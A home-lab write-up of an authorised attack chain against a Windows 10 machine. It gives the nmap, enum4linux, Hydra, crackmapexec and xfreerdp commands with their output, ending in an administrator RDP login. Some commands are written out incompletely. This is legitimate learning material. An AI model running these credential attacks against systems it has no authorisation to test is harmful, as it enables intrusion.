Home Lab: RDP Attack Chain

Target: Windows 10 x64 (Build 19041) — Dell physical machine
Attacker: Kali Linux 2026.2.5 — MSI laptop
Date: 2026-05-28
Scope: Authorized personal lab — written permission documented

Objective
Simulate a black-box attack scenario against a Windows target with no prior knowledge of
credentials or username. Starting point: target IP and a known open port.

Environment

Role Machine OS
Attacker MSI GT72 Kali Linux 2026.2.5
Target Dell (Addlogix NIC) Windows 10 x64 Build 19041
Network 192.168.8.0/24 Home lab via TP-Link managed switch

Phase 1: Host Discovery
Started with a ping sweep across the full home subnet to identify live hosts.

      nmap -sn 192.168.1.0/24

Lesson learned: Scan returned 14 live hosts but all showed 3389/tcp closed . Spent time
troubleshooting before realizing the target was on a different subnet entirely. The Dell was
on 192.168.8.0/24 , not 192.168.1.0/24 .

Mistake: Assumed the subnet without verifying. Always confirm the target’s actual IP with
ipconfig on the target machine before scanning.

Phase 2: Service Identification
Once the correct subnet was identified, ran a targeted service version scan against the
target.
      nmap -sV -p 3389 192.168.8.168

Result:
  PORT STATE SERVICE VERSION
  3389/tcp open ms-wbt-server Microsoft Terminal Services
  MAC Address: 00:12:96:05:2A:CD (Addlogix)
  Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

RDP confirmed open on port 3389. OS fingerprinted as Windows. Hostname not yet known.
Mistake: First attempt used 192.168.1.x with a literal x instead of a wildcard — nmap
failed to resolve it. Corrected to 192.168.1.* then discovered the wrong subnet entirely.

Phase 3: Username Enumeration
With RDP confirmed, the next goal was username discovery without any credentials. Used
enum4linux for SMB-based enumeration.

      enum4linux -a 192.168.8.168

Result:
  Known Usernames: administrator, guest, krbtgt, domain admins, root, bin, none
  [E] Can't find workgroup/domain
  [E] Server doesn't allow session using username '', password ''

Null sessions were blocked — Windows 10 default behavior. However, enum4linux still
returned a known username list from the RID enumeration attempt before being cut off.

Key finding: administrator confirmed as a valid username without any authentication.
Lesson: Null session blocking stops full enumeration but does not prevent basic username
leakage. This is why the built-in Administrator account should be renamed on hardened
systems.

Phase 4: Credential Attack — Attempt 1 (Hydra vs RDP)
With administrator as the target username, attempted brute force directly against RDP
using Hydra.

      hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.8.168 -t

Errors encountered:
First attempt failed — rockyou.txt had not been extracted from its gzip archive.
    
      sudo gunzip /usr/share/wordlists/rockyou.txt.gz

Extracted successfully at 134MB. Reran Hydra.

Result: Connection failures after 3 attempts. RDP throttled and dropped connections
aggressively.

  [ERROR] freerdp: The connection failed to establish.
  [ERROR] all children were disabled due too many connection errors
  0 of 1 target completed, 0 valid password found

Reduced threads and added wait delay:

      hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://192.168.8.168 -t

Still failed — RDP continued dropping connections after a handful of attempts.

Lesson: RDP brute force is unreliable in practice. Modern Windows rate-limits and drops
repeated RDP connections. This attack vector is noisy and largely ineffective against default
Windows 10 targets. Real engagements obtain credentials from other sources first, then use
them to RDP in.

Mistake: Spent significant time fighting Hydra against RDP before pivoting to a better
approach. Path of least resistance is SMB enumeration, not direct RDP brute force.

Mistake: Repeatedly typed /usr/share/wordlist/rockyou.txt (missing the s ) across
multiple attempts. Tab completion in the terminal would have prevented this entirely. Always
use tab completion for file paths.

Phase 5: Credential Attack — Attempt 2 (crackmapexec vs
SMB)
Pivoted from RDP to SMB as the credential attack surface. First confirmed SMB port status.

      nmap -p 445 192.168.8.168

Result: 445/tcp filtered — Windows firewall was blocking SMB.
Enabled File and Printer Sharing on the target via admin PowerShell:

      netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes

Confirmed port status again:

      nmap -p 445 192.168.8.168

Result: 445/tcp open microsoft-ds — SMB now accessible.
Created a targeted password list rather than running full rockyou against SMB:

      echo -e "Password1\npassword\nlab123\nWelcome1\nAdmin123\nP@ssw0rd\npassword123"

Ran crackmapexec:

      crackmapexec smb 192.168.8.168 -u administrator -p quickpass.txt

Result:
    SMB 192.168.8.168 445 WIN-0E4NISQAKIM [*] Windows 10 / Server 2019 Build 19041 x64
    SMB 192.168.8.168 445 WIN-0E4NISQAKIM [+] DESKTOP-9UBQVPR\administrator:Password1

Valid credentials confirmed. Full admin access indicated by (Pwn3d!) .

Additional recon from crackmapexec output:
    Hostname: WIN-0E4NISQAKIM
    Domain: DESKTOP-9UBQVPR
    OS: Windows 10 / Server 2019 Build 19041 x64
    SMB Signing: False (relevant for relay attacks)
    SMBv1: False

Lesson: crackmapexec returns significant target intelligence on a successful auth — OS,
hostname, domain, and signing status — all from a single credential confirmation. This is
why it is the preferred tool for credential validation over Hydra against RDP.


Phase 6: Initial Access via RDP
With valid credentials confirmed, connected to the target via RDP from Kali.

      xfreerdp /u:administrator /p:Password1 /v:192.168.8.168 /cert-ignore

Errors encountered:
First xfreerdp attempt included +clipboard and /dynamic-resolution flags which caused
a parse error on this Kali build:
    [ERROR] Failed at index 6: Unexpected keyword

Removed optional flags and connected with minimal syntax. Session established
successfully.
Result: Full graphical RDP session on Windows 10 target as Administrator.

Phase 7: Post-Exploitation Enumeration

Upon landing on the desktop, ran standard situational awareness commands.
    whoami /all
    net users
    net localgroup administrators
    ipconfig
    systeminfo

Located seeded lure files planted during lab setup — simulating credential and PII discovery
during post-exploitation.


Attack Chain Summary

  Host Discovery (nmap ping sweep)
  |
  Service Identification (nmap -sV port 3389 = RDP open)
  |
  Username Enumeration (enum4linux = administrator confirmed)
  |
  SMB Port Confirmed Open (nmap port 445)
  |
  Credential Attack (crackmapexec = Password1 found)
  |
  Initial Access (xfreerdp RDP session as Administrator)
  |
  Post-Exploitation (whoami, net users, lure file discovery)

Tools Used

Tool Purpose
  nmap              Host discovery, port scanning, service fingerprinting
  enum4linux        SMB/RPC username enumeration
  Hydra             RDP brute force (attempted, failed)
  crackmapexec      SMB credential attack and validation
  xfreerdp          RDP client for initial access
  gunzip            Extracted rockyou.txt wordlist


Key Lessons
On methodology: Enumerate SMB before attacking RDP. Usernames leak from SMB even
when null sessions are blocked. Valid usernames dramatically reduce the credential attack
surface.

On tooling: RDP brute force via Hydra is unreliable against modern Windows. SMB
credential spraying via crackmapexec is faster, quieter, and more consistent. Match the tool
to the protocol.

On wordlists: Targeted password lists beat full rockyou for lab exercises and controlled 
scenarios. In real engagements, common corporate passwords (Season+Year,
CompanyName+123) are often more effective than raw dictionary attacks.

On tab completion: Use it. Every time. File path typos ( wordlist vs wordlists ) cost
significant time and are entirely preventable.

On subnets: Confirm target IP before scanning. A target on the wrong subnet looks
identical to a filtered or offline host.

On HKLM vs HKCU: Registry edits to HKLM require elevated privileges. HKCU is per-user
and does not. This distinction appears constantly in privilege escalation scenarios.

